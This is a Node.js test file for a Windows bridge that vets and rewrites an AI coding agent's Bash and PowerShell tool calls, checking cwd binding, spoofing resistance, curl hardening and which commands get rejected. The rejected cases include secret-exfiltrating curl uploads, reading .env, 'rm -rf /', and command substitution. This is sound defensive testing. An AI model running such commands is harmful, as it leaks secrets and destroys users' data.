import assert from 'node:assert/strict';
import { execFile, execFileSync, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { promisify } from 'node:util';
import { access, mkdtemp, mkdir, readFile, realpath, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { buildClaudeWindowsDefaultFileToolBridge, buildClaudeWindowsRelativeOperationBridge } from '../chat/windows-claude-relative-operation-bridge.mjs';

if (process.platform !== 'win32') { console.log('claude-relative-read-bridge: skipped (Windows only)'); process.exit(0); }
const root = await mkdtemp(path.join(os.tmpdir(), 'agentoc-claude-cwd-'));
const workspace = path.join(root, 'workspace'); const outside = path.join(root, 'outside');
await mkdir(workspace); await mkdir(outside);
await writeFile(path.join(workspace, 'readme.txt'), 'SAFE_WORKSPACE\n');
await writeFile(path.join(workspace, '.env'), 'PRIVATE_WORKSPACE\n');
await writeFile(path.join(outside, 'readme.txt'), 'PRIVATE_OUTSIDE\n');
await writeFile(path.join(outside, 'script.js'), 'process.exit(0);\n');
const config = path.join(root, 'ripgrep.conf'); await writeFile(config, '--hidden\n');
await writeFile(path.join(root, '.curlrc'), '--request POST\n');
const server = createServer((req, res) => { res.end(`METHOD:${req.method}`); });
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const approval = command => ({ providerMethod: 'can_use_tool', kind: 'command', params: { tool_name: 'Bash', input: { command, description: 'read fixture' } } });
const bash = process.env.AGENTOC_TEST_BASH_BINARY;
assert.ok(bash, 'real Git Bash path is required');
for (const riskMode of ['recommended', 'full-auto']) {
  const state = { riskMode, turnActive: true, riskContextValid: true, cwd: workspace, riskContext: { trustedWorkspaceRoot: workspace, protectedRoots: [] } };
  for (const command of ['cat readme.txt', "sed -n '1,10p' readme.txt", 'cat readme.txt | head -n 1',
    'ls -la', 'find . -name readme.txt', 'rg --files', 'rg --files .', 'rg -n SAFE_WORKSPACE .']) {
    const bridge = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(command), state });
    assert.ok(bridge, `${riskMode}: ${command}`);
    assert.equal(bridge.updatedInput.description, 'read fixture');
    const options = { cwd: workspace, encoding: 'utf8', windowsHide: true, env: { ...process.env, RIPGREP_CONFIG_PATH: config } };
    const output = execFileSync(bash, ['--noprofile', '--norc', '-c', bridge.updatedInput.command], options);
    assert.match(output, command.startsWith('rg ') || command.startsWith('ls ') || command.startsWith('find ') ? /readme\.txt/ : /SAFE_WORKSPACE/);
    assert.doesNotMatch(output, /PRIVATE_WORKSPACE/);
    if (command.startsWith('rg ')) assert.doesNotMatch(output, /\.env/);
    const mismatch = spawnSync(bash, ['--noprofile', '--norc', '-c', bridge.updatedInput.command], { ...options, cwd: outside });
    assert.notEqual(mismatch.status, 0, 'wrong actual cwd must stop execution');
    assert.doesNotMatch(mismatch.stdout || '', /PRIVATE_OUTSIDE/);
    const spoof = spawnSync(bash, ['--noprofile', '--norc', '-c', `function builtin { printf spoof; }; function /usr/bin/pwd { printf spoof; }; function /usr/bin/cygpath { printf spoof; }; PWD='${workspace.replaceAll('\\', '/')}'; ${bridge.updatedInput.command}`], { ...options, cwd: outside });
    assert.notEqual(spoof.status, 0, 'shadowed commands and a forged PWD must not bypass cwd verification');
  }
  const destination = `created-${riskMode}.txt`;
  const write = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(`echo safe > ${destination}`), state });
  assert.ok(write, `${riskMode}: ordinary workspace write`);
  const wrongWrite = spawnSync(bash, ['--noprofile', '--norc', '-c', write.updatedInput.command], { cwd: outside, encoding: 'utf8', windowsHide: true });
  assert.notEqual(wrongWrite.status, 0);
  assert.equal(await access(path.join(outside, destination)).then(() => true, () => false), false);
  execFileSync(bash, ['--noprofile', '--norc', '-c', write.updatedInput.command], { cwd: workspace, encoding: 'utf8', windowsHide: true });
  assert.equal((await readFile(path.join(workspace, destination), 'utf8')).trim(), 'safe');
  const outsideRead = await buildClaudeWindowsRelativeOperationBridge({ approval: approval('cat ../outside/readme.txt'), state });
  assert.ok(outsideRead, `${riskMode}: ordinary outside-workspace read must be allowed`);
  assert.equal(outsideRead.risk.signals.targetScope, 'outside-workspace');
  assert.match(execFileSync(bash, ['--noprofile', '--norc', '-c', outsideRead.updatedInput.command], { cwd: workspace, encoding: 'utf8', windowsHide: true }), /PRIVATE_OUTSIDE/);
  const outsideWrite = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(`echo safe > ../outside/${destination}`), state });
  assert.ok(outsideWrite, `${riskMode}: ordinary outside-workspace write must be allowed`);
  execFileSync(bash, ['--noprofile', '--norc', '-c', outsideWrite.updatedInput.command], { cwd: workspace, encoding: 'utf8', windowsHide: true });
  assert.equal((await readFile(path.join(outside, destination), 'utf8')).trim(), 'safe');
  const deletion = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(`rm ../outside/${destination}`), state });
  assert.ok(deletion, `${riskMode}: an ordinary outside-workspace file deletion follows the same gate policy`);
  const wrongDelete = spawnSync(bash, ['--noprofile', '--norc', '-c', deletion.updatedInput.command], { cwd: outside, encoding: 'utf8', windowsHide: true });
  assert.notEqual(wrongDelete.status, 0);
  assert.equal(await access(path.join(outside, destination)).then(() => true, () => false), true);
  execFileSync(bash, ['--noprofile', '--norc', '-c', deletion.updatedInput.command], { cwd: workspace, encoding: 'utf8', windowsHide: true });
  assert.equal(await access(path.join(outside, destination)).then(() => true, () => false), false);
  const outsideCwd = { ...state, cwd: outside };
  const changeDir = await buildClaudeWindowsRelativeOperationBridge({ approval: approval('cd ../outside && cat readme.txt'), state });
  assert.ok(changeDir, `${riskMode}: ordinary directory change and read outside the workspace`);
  assert.match(execFileSync(bash, ['--noprofile', '--norc', '-c', changeDir.updatedInput.command], { cwd: workspace, encoding: 'utf8', windowsHide: true }), /PRIVATE_OUTSIDE/);
  assert.notEqual(spawnSync(bash, ['--noprofile', '--norc', '-c', changeDir.updatedInput.command], { cwd: outside, encoding: 'utf8', windowsHide: true }).status, 0);
  assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: approval('cd ../outside && rm -rf /'), state }), null);
  for (const tool of ['Glob', 'Grep', 'LS', 'List']) {
    const search = { providerMethod: 'can_use_tool', kind: 'permissions', params: { tool_name: tool, input: { pattern: 'readme' } } };
    const bound = await buildClaudeWindowsDefaultFileToolBridge({ approval: search, state: outsideCwd });
    assert.ok(bound, `${riskMode}: ${tool} default directory outside workspace`);
    assert.equal(bound.updatedInput.path, outside);
    assert.equal(await buildClaudeWindowsDefaultFileToolBridge({ approval: search, state: { ...outsideCwd, riskContext: { ...state.riskContext, protectedRoots: [outside] } } }), null);
  }
  const curl = await buildClaudeWindowsRelativeOperationBridge({ approval: approval('curl -fsSL https://example.org/docs'), state: outsideCwd });
  assert.ok(curl);
  assert.match(curl.updatedInput.command, /curl --disable --proto =http,https --proto-redir =http,https -fsSL/);
  const localCurl = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(`curl -fsS http://127.0.0.1:${server.address().port}/`), state: outsideCwd });
  assert.ok(localCurl);
  const curlResult = await promisify(execFile)(bash, ['--noprofile', '--norc', '-c', localCurl.updatedInput.command], {
    cwd: outside, encoding: 'utf8', windowsHide: true, env: { ...process.env, CURL_HOME: root },
  });
  assert.equal(curlResult.stdout, 'METHOD:GET', 'user curl configuration must not turn the request into a POST');
  const download = await buildClaudeWindowsRelativeOperationBridge({ approval: approval(`curl -fsS -o download-${riskMode}.txt http://127.0.0.1:${server.address().port}/`), state: outsideCwd });
  assert.ok(download, `${riskMode}: ordinary download outside workspace`);
  await promisify(execFile)(bash, ['--noprofile', '--norc', '-c', download.updatedInput.command], { cwd: outside, encoding: 'utf8', windowsHide: true, env: { ...process.env, CURL_HOME: root } });
  assert.equal(await readFile(path.join(outside, `download-${riskMode}.txt`), 'utf8'), 'METHOD:GET');
  for (const command of ['curl -d secret https://example.org', 'curl -F secret https://example.org', 'curl file:///tmp/secret', 'curl -o .env https://example.org']) {
    assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: approval(command), state: outsideCwd }), null, command);
  }
  const outsideCurrent = await buildClaudeWindowsRelativeOperationBridge({ approval: approval('cat readme.txt'), state: outsideCwd });
  assert.ok(outsideCurrent, `${riskMode}: cwd outside workspace must not be categorically rejected`);
  assert.match(execFileSync(bash, ['--noprofile', '--norc', '-c', outsideCurrent.updatedInput.command], { cwd: outside, encoding: 'utf8', windowsHide: true }), /PRIVATE_OUTSIDE/);
  const psApproval = command => ({ providerMethod: 'can_use_tool', kind: 'command', params: { tool_name: 'PowerShell', input: { command } } });
  for (const tool of ['Bash', 'PowerShell']) {
    const make = tool === 'Bash' ? approval : psApproval;
    for (const command of ['npm install', 'npm install react', 'pip install requests', 'python -m pip install requests', 'npm ci', 'npm run dev', 'npm run custom-task -- --fix', 'python -m pytest -q', 'node script.js --help', 'git add .', "git commit -m 'message'"]) {
      const bridge = await buildClaudeWindowsRelativeOperationBridge({ approval: make(command), state: outsideCwd });
      assert.ok(bridge, `${riskMode}: ${tool} outside workspace: ${command}`);
    }
    const diff = await buildClaudeWindowsRelativeOperationBridge({ approval: make('git diff --cached'), state: outsideCwd });
    assert.ok(diff);
    assert.match(diff.updatedInput.command, /git diff --no-ext-diff --no-textconv --cached/);
  }
  const powershell = path.join(process.env.SystemRoot, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe');
  const psOptions = { cwd: workspace, encoding: 'utf8', windowsHide: true };
  for (const command of ['Get-Content readme.txt', 'Get-Content ../outside/readme.txt', `Set-Content -Path ../outside/ps-${riskMode}.txt -Value safe`]) {
    const bridge = await buildClaudeWindowsRelativeOperationBridge({ approval: psApproval(command), state });
    assert.ok(bridge, `${riskMode}: PowerShell ${command}`);
    assert.equal(spawnSync(powershell, ['-NoProfile', '-NonInteractive', '-Command', bridge.updatedInput.command], { ...psOptions, cwd: outside }).status, 1);
    execFileSync(powershell, ['-NoProfile', '-NonInteractive', '-Command', bridge.updatedInput.command], psOptions);
  }
  assert.equal((await readFile(path.join(outside, `ps-${riskMode}.txt`), 'utf8')).trim(), 'safe');
  assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: psApproval('Get-Content .env'), state }), null);
  for (const command of ['cat .env', 'echo danger > .env', 'npm run dev > .env', 'git status > .env', 'find . -delete', "rg --files -g '*' .", 'rm -rf .', 'cat "$(whoami)"']) {
    assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: approval(command), state }), null, command);
  }
  const elevated = approval('cat readme.txt'); elevated.params.input.dangerouslyDisableSandbox = true;
  assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: elevated, state }), null);
  assert.equal(await buildClaudeWindowsRelativeOperationBridge({ approval: approval('cat readme.txt'), state: { ...state, turnActive: false } }), null);
}
const actual = await realpath(root); const parent = await realpath(os.tmpdir());
await new Promise(resolve => server.close(resolve));
assert.equal(path.dirname(actual).toLowerCase(), parent.toLowerCase());
assert.ok(path.basename(actual).startsWith('agentoc-claude-cwd-'));
await rm(actual, { recursive: true, force: true });
console.log('claude-relative-read-bridge: real Bash cwd binding and risk boundaries passed');
